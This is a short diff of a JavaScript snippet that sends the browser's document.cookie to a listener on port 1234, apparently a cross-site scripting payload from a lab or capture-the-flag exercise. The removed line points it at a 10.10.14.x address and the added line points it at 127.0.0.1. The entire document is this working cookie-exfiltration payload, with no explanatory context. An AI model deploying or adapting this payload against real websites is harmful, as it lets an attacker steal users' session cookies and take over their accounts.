@@ -1,3 +1,3 @@
 var xhttp = new XMLHttpRequest();
-xhttp.open('GET', 'http://10.10.14.19:1234' + document.cookie, true);
+xhttp.open('GET', 'http://127.0.0.1:1234/?'+ document.cookie,  true);
 xhttp.send();
